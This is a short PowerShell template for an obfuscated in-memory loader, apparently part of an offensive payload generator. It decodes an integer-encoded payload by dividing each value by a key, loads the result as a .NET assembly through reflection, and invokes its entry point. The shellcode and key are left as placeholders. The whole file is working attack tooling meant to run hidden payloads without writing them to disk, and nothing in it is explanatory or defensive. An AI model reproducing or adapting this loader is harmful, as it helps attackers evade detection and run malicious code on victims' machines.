function __DecodePayload__ {
    param([int[]]$__Payload__,[int]$__Key__)

    if ($__Payload__ -eq $null -or $__Payload__.Length -eq 0) {
        return $null
    }

    $__RawPayload__ = New-Object byte[] $__Payload__.Length

    for($i = 0; $i -lt $__Payload__.Length; $i++) {
        $__RawPayload__[$i] = [byte]([math]::Floor($__Payload__[$i] / $__Key__))
    }

    return $__RawPayload__
}

$__PayloadTemplate__ = [int[]]@(__SHELLCODE_PLACEHOLDER__)

$__PayloadKey__ = __KEY_PLACEHOLDER__

$__RawLoader__ = __DecodePayload__ $__PayloadTemplate__ $__PayloadKey__

$__Assembly__ = [System.Reflection.Assembly]::Load($__RawLoader__)

$__Entry__ = $__Assembly__.EntryPoint

$__Entry__.Invoke($null, @())
